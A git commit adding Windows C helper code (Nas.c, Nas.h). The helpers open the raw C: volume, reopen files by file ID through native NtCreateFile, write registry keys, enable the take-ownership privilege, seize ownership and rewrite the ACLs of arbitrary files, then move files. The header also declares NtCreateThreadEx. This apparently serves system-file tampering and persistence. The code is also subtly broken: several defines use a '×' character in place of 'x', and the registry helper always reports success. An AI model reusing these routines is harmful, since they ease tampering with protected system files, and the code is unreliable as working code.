611384d8825d6c0d7bc8707260c7ed458a0a9dc4
Yn <30512781+akayn@users.noreply.github.com>
2017-08-07 02:23:58 +0300

    Add files via upload

---
+++ src/Nas.c
@@ -0,0 +1,369 @@
+
+#include "stdafx.h"
+#include "def.h"
+#include "Nas.h"
+
+
+FORCEINLINE
+VOID
+RtlInitUnicodeString(
+	_In_ PUNICODE_STRING Dst,
+	_In_ PWSTR Src
+)
+{
+	Dst->Buffer = Src;
+	Dst->MaximumLength = Dst->Length = wcslen(Src) * sizeof(WCHAR);
+}
+
+
+VOID
+SeCreateFile(
+	_In_ PCWSTR loc
+)
+{
+	HANDLE d = CreateFile(L"\\\\.\\c:",
+		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ
+		| FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+	BY_HANDLE_FILE_INFORMATION i;
+	HANDLE f = CreateFile(loc,
+		GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL, NULL);
+	GetFileInformationByHandle(f, &i);
+	CloseHandle(f);
+
+	pNtCreateFile NtCreatefile = (
+		pNtCreateFile)GetProcAddress(
+			GetModuleHandle(L"ntdll.dll"), "NtCreateFile");
+	pNtReadFile NtReadFile = (
+		pNtReadFile)GetProcAddress(
+			GetModuleHandle(L"ntdll.dll"), "NtReadFile");
+
+	ULONG fid[2] = { i.nFileIndexLow, i.nFileIndexHigh };
+	UNICODE_STRING fidstr = { 8, 8, (PWSTR)fid };
+
+	OBJECT_ATTRIBUTES oa = { 0 };
+	InitializeObjectAttributes(&oa, &fidstr,
+		OBJ_CASE_INSENSITIVE, d, NULL);
+
+	ULONG iosb[2];
+	ULONG status = NtCreatefile(&f, GENERIC_ALL, &oa, iosb, NULL,
+		FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE,
+		NULL, NULL, NULL, 0);
+	UCHAR buf[11] = { 0 };
+	LONG Off[2] = { 0 };
+	CloseHandle(f);
+	CloseHandle(d);
+}
+
+
+VOID
+SeWriteFile(
+	_In_ PCWSTR loc,
+	_In_ LPCVOID Content,
+	_In_ DWORD nByte
+)
+{
+	HANDLE d = CreateFile(L"\\\\.\\c:",
+		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ
+		| FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
+	BY_HANDLE_FILE_INFORMATION i;
+	HANDLE f = CreateFile(loc, GENERIC_WRITE, 0,
+		NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	ULONG Byte;
+	WriteFile(f, Content, nByte, &Byte, NULL);
+	GetFileInformationByHandle(f, &i);
+	CloseHandle(f);
+
+	pNtCreateFile NtCreatefile = 
+		(pNtCreateFile)GetProcAddress(
+			GetModuleHandle(L"ntdll.dll"), "NtCreateFile");
+
+	ULONG fid[2] = { i.nFileIndexLow, i.nFileIndexHigh };
+	UNICODE_STRING fidstr = { 8, 8, (PWSTR)fid };
+
+	OBJECT_ATTRIBUTES oa = { 0 };
+	InitializeObjectAttributes(&oa, &fidstr, 
+		OBJ_CASE_INSENSITIVE, d, NULL);
+
+	ULONG iosb[2];
+	ULONG status = NtCreatefile(&f, GENERIC_ALL, 
+		&oa, iosb, NULL, FILE_ATTRIBUTE_NORMAL, 
+		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, NULL, NULL, 0);
+	UCHAR buf[11] = { 0 };
+	LONG Off[2] = { 0 };
+	CloseHandle(f);
+	CloseHandle(d);
+}
+
+
+BOOL
+SeWriteReg(
+	_In_ HKEY Root,
+	_In_ LPCTSTR SubK,
+	_In_ LPCTSTR lValu,
+	_In_ LPCTSTR lDat
+)
+{
+	HKEY hKey;
+	BOOL bResult = FALSE;
+	DWORD dwDisposition = 0;
+	REGSAM samDesired = KEY_ALL_ACCESS;
+
+	if (RegCreateKeyEx(
+		Root,
+		SubK,
+		0,
+		NULL,
+		0,
+		samDesired,
+		NULL,
+		&hKey,
+		&dwDisposition
+	) != ERROR_SUCCESS
+		)
+	{
+		goto CLEANUP;
+	}
+
+	if (RegSetValueEx(
+		hKey, lValu, 0, REG_SZ, (const PBYTE)lDat,
+		(_tcslen(lDat) + 1) * sizeof(TCHAR)
+	) != ERROR_SUCCESS
+		)
+	{
+		bResult = FALSE;
+	}
+
+	bResult = TRUE;
+
+CLEANUP:
+	RegCloseKey(hKey);
+	return bResult;
+}
+
+
+BOOL
+SeCopyFile(
+	_In_ LPCWSTR Src,
+	_In_ LPCWSTR Dst
+) {
+	__try {
+		CopyFileEx(
+			Src,
+			Dst,
+			NULL,
+			NULL,
+			NULL,
+			NULL
+		);
+		return TRUE;
+	}
+	__except (1) {
+		return FALSE;
+	}
+}
+
+BOOL
+SeAdjustPrivilege(
+	_In_ HANDLE hToken,
+	_In_ LPCTSTR lpszPrivilege,
+	_In_ BOOL bEnablePrivilege
+)
+{
+	TOKEN_PRIVILEGES tp;
+	LUID luid;
+
+	if (!LookupPrivilegeValue(
+		NULL,
+		lpszPrivilege,
+		&luid))
+	{
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	if (bEnablePrivilege)
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	else
+		tp.Privileges[0].Attributes = 0;
+
+
+	if (!AdjustTokenPrivileges(
+		hToken,
+		FALSE,
+		&tp,
+		sizeof(TOKEN_PRIVILEGES),
+		(PTOKEN_PRIVILEGES)NULL,
+		(PDWORD)NULL))
+	{
+		return FALSE;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+
+	{
+		return FALSE;
+	}
+
+	return TRUE;
+}
+
+
+BOOL
+SeTakeOwnership(
+	_In_ LPTSTR lpszOwnFile,
+	_In_ LPCTSTR oName,
+	_In_ LPCTSTR nName
+)
+{
+
+	BOOL bRetval = FALSE;
+	HANDLE hToken = NULL;
+	PSID pSIDAdmin = NULL;
+	PSID pSIDEveryone = NULL;
+	PACL pACL = NULL;
+	SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
+		SECURITY_WORLD_SID_AUTHORITY;
+	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
+	EXPLICIT_ACCESS ea[2];
+	DWORD dwRes;
+
+
+	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
+		SECURITY_WORLD_RID,
+		0,
+		0, 0, 0, 0, 0, 0,
+		&pSIDEveryone))
+	{
+		goto Cleanup;
+	}
+
+
+	if (!AllocateAndInitializeSid(&SIDAuthNT, 2,
+		SECURITY_BUILTIN_DOMAIN_RID,
+		DOMAIN_ALIAS_RID_ADMINS,
+		0, 0, 0, 0, 0, 0,
+		&pSIDAdmin))
+	{
+		goto Cleanup;
+	}
+	pRtlSecureZeroMemory RtlSecureZeroMemory = (pRtlSecureZeroMemory)GetProcAddress(
+		GetModuleHandle(L"ntdll.dll"), "RtlSecureZeroMemory");
+	ZeroMemory(&ea, 2 * sizeof(EXPLICIT_ACCESS));
+
+
+	ea[0].grfAccessPermissions = GENERIC_READ;
+	ea[0].grfAccessMode = SET_ACCESS;
+	ea[0].grfInheritance = NO_INHERITANCE;
+	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
+	ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;
+
+
+	ea[1].grfAccessPermissions = GENERIC_ALL;
+	ea[1].grfAccessMode = SET_ACCESS;
+	ea[1].grfInheritance = NO_INHERITANCE;
+	ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
+	ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
+	ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;
+
+	if (ERROR_SUCCESS != SetEntriesInAcl(2,
+		ea,
+		NULL,
+		&pACL))
+	{
+		goto Cleanup;
+	}
+
+
+	dwRes = SetNamedSecurityInfo(
+		lpszOwnFile,                
+		SE_FILE_OBJECT,             
+		DACL_SECURITY_INFORMATION, 
+		NULL, NULL,                  
+		pACL,                       
+		NULL);                      
+
+	if (ERROR_SUCCESS == dwRes)
+	{
+		bRetval = TRUE;
+		goto Cleanup;
+	}
+	if (dwRes != ERROR_ACCESS_DENIED)
+	{
+		goto Cleanup;
+	}
+
+
+	if (!OpenProcessToken(GetCurrentProcess(),
+		TOKEN_ADJUST_PRIVILEGES,
+		&hToken))
+	{
+		goto Cleanup;
+	}
+
+
+	if (!SeAdjustPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, TRUE))
+	{
+		goto Cleanup;
+	}
+
+
+	dwRes = SetNamedSecurityInfo(
+		lpszOwnFile,                
+		SE_FILE_OBJECT,              
+		OWNER_SECURITY_INFORMATION,
+		pSIDAdmin,                   
+		NULL,
+		NULL,
+		NULL);
+
+	if (dwRes != ERROR_SUCCESS)
+	{
+		goto Cleanup;
+	}
+
+
+	if (!SeAdjustPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, FALSE))
+	{
+		goto Cleanup;
+	}
+
+	dwRes = SetNamedSecurityInfo(
+		lpszOwnFile,                
+		SE_FILE_OBJECT,             
+		DACL_SECURITY_INFORMATION,  
+		NULL, NULL,                  
+		pACL,                        
+		NULL);                       
+
+	if (dwRes == ERROR_SUCCESS)
+	{
+		bRetval = TRUE;
+	}
+	else
+	{
+	}
+	
+
+Cleanup:
+	MoveFile(
+		oName,
+		nName
+	);
+	if (pSIDAdmin)
+		FreeSid(pSIDAdmin);
+
+	if (pSIDEveryone)
+		FreeSid(pSIDEveryone);
+
+	if (pACL)
+		LocalFree(pACL);
+
+	if (hToken)
+		CloseHandle(hToken);
+
+	return bRetval;
+
+}
---
+++ src/Nas.h
@@ -0,0 +1,151 @@
+
+#include "def.h"
+#include <ntstatus.h>
+#include <Winternl.h>
+#include <WinBase.h>
+
+#pragma comment(lib, "cmcfg32.lib")
+#pragma comment(lib, "Kernel32.lib")
+
+typedef NTSTATUS(NTAPI * TFNNtCreateFile)(
+	_Out_ PHANDLE,
+	_In_ ACCESS_MASK,
+	_In_ POBJECT_ATTRIBUTES,
+	_Out_ PIO_STATUS_BLOCK,
+	_In_opt_ PLARGE_INTEGER,
+	_In_ ULONG,
+	_In_ ULONG,
+	_In_ ULONG,
+	_In_ ULONG,
+	_In_ PVOID,
+	_In_ ULONG
+	);
+
+typedef NTSTATUS(__stdcall *pNtCreateThreadEx)(
+	_Out_ PHANDLE,
+	_In_ ACCESS_MASK,
+	_In_ PVOID,
+	_In_ HANDLE,
+	_In_ PVOID,
+	_In_ PVOID,
+	_In_ ULONG,
+	_In_ SIZE_T,
+	_In_ SIZE_T,
+	_In_ SIZE_T,
+	_Out_ PVOID
+	);
+
+FORCEINLINE
+VOID
+RtlInitUnicodeString(
+	_In_ PUNICODE_STRING Dst,
+	_In_ PWSTR Src
+);
+
+typedef PVOID(__stdcall *pRtlSecureZeroMemory)(
+	_Out_ PVOID  ptr,
+	_In_  SIZE_T cnt
+	);
+
+typedef ULONG(__stdcall *pNtCreateFile)(
+	PHANDLE FileHandle,
+	ULONG DesiredAccess,
+	PVOID ObjectAttributes,
+	PVOID IoStatusBlock,
+	PLARGE_INTEGER AllocationSize,
+	ULONG FileAttributes,
+	ULONG ShareAccess,
+	ULONG CreateDisposition,
+	ULONG CreateOptions,
+	PVOID EaBuffer,
+	ULONG EaLength
+	);
+
+typedef ULONG(__stdcall *pNtReadFile)(
+	IN HANDLE  FileHandle,
+	IN HANDLE  Event  OPTIONAL,
+	IN PVOID  ApcRoutine  OPTIONAL,
+	IN PVOID  ApcContext  OPTIONAL,
+	OUT PVOID  IoStatusBlock,
+	OUT PVOID  Buffer,
+	IN ULONG  Length,
+	IN PLARGE_INTEGER  ByteOffset  OPTIONAL,
+	IN PULONG  Key  OPTIONAL
+	);
+
+typedef NTSTATUS(__stdcall *pNtCreateKey)(
+	_Out_ PHANDLE,
+	_In_ ACCESS_MASK,
+	_In_ POBJECT_ATTRIBUTES,
+	_Reserved_ ULONG,
+	_In_opt_ PUNICODE_STRING,
+	_In_ ULONG,
+	_Out_opt_ PULONG
+	);
+
+typedef NTSTATUS(__stdcall *pNtSetValueKey)(
+	_In_ HANDLE,
+	_In_ PUNICODE_STRING,
+	_In_opt_ ULONG,
+	_In_ ULONG,
+	_In_opt_ PVOID,
+	_In_ ULONG
+	);
+
+typedef NTSTATUS(__stdcall *pNtClose)(
+	_In_ HANDLE
+	);
+
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+(p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
+(p)->RootDirectory = r;                             \
+(p)->Attributes = a;                                \
+(p)->ObjectName = n;                                \
+(p)->SecurityDescriptor = s;                        \
+(p)->SecurityQualityOfService = NULL;               \
+}
+
+#define OBJ_CASE_INSENSITIVE  0x00000040L
+#define FILE_NON_DIRECTORY_FILE  0×00000040
+#define FILE_OPEN_BY_FILE_ID  0×00002000
+#define FILE_OPEN   0×00000001
+
+VOID
+SeCreateFile(
+	_In_ PCWSTR loc
+);
+
+VOID
+SeWriteFile(
+	_In_ PCWSTR loc,
+	_In_ LPCVOID Content,
+	_In_ DWORD nByte
+);
+
+BOOL
+SeWriteReg(
+	_In_ HKEY Root,
+	_In_ LPCTSTR SubK,
+	_In_ LPCTSTR lValu,
+	_In_ LPCTSTR lDat
+);
+
+BOOL
+SeCopyFile(
+	_In_ LPCWSTR Src,
+	_In_ LPCWSTR Dst
+);
+
+BOOL
+SeAdjustPrivilege(
+	_In_ HANDLE hToken,
+	_In_ LPCTSTR lpszPrivilege,
+	_In_ BOOL bEnablePrivilege
+);
+
+BOOL
+SeTakeOwnership(
+	_In_ LPTSTR lpszOwnFile,
+	_In_ LPCTSTR oName,
+	_In_ LPCTSTR nName
+);
